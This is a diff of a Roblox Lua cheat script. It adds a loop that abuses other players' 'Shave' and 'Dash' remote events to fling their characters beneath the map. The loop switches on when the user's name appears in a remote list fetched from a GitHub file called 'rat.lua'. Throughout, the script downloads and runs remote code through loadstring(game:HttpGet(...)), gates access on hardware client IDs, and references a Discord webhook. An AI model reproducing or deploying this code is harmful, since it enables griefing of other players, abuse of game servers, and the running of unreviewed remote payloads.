@@ -292,9 +292,9 @@ local url = "https://discord.com/api/webhooks/1268351413751120002/YX_I7VpV7ECm8b
 end)  
 
 _G.asdwqelist = false
+_G.antiusefree = false
 
 listedaxw = loadstring(game:HttpGet('https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/whitelist.lua'))()
-
         for _, v1 in pairs(listedaxw) do
 gethwid = game:GetService("RbxAnalyticsService"):GetClientId()
             if gethwid == v1 then
@@ -309,7 +309,42 @@ _G.asdwqelist = true
             end
         end
 
-anticamp = loadstring(game:HttpGet("https://raw.githubusercontent.com/Iamcutehehe/hehehe/main/golden.lua"))()
+antifreezsc = loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/whocares/main/rat.lua'))()
+        for _, v3 in pairs(antifreezsc) do
+            if game.Players.LocalPlayer.Name == v3 then
+_G.antiusefree = true
+            end
+        end
+
+if _G.antiusefree then
+spawn(function()
+while wait(0.1) do
+pcall(function()
+for i,v in pairs(game.Players:GetChildren()) do
+if v.Name ~= game.Players.LocalPlayer.Name then
+for i,c in pairs(game.Workspace:GetChildren()) do
+if c:IsA("Model") and c.Name == v.Name then
+local args = {
+    [1] = c.HumanoidRootPart.CFrame * CFrame.new(0,-25,0),
+    [2] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach")
+}
+
+c.Shave:FireServer(unpack(args))
+local args = {
+    [1] = c.HumanoidRootPart.CFrame * CFrame.new(0,-25,0),
+    [2] = workspace:WaitForChild("IslandTown"):WaitForChild("Beach"):WaitForChild("Beach")
+}
+
+c.Dash:FireServer(unpack(args))
+wait()
+end
+end
+end
+end
+end)
+end
+end)
+end
 
 if _G.asdwqelist then
 do
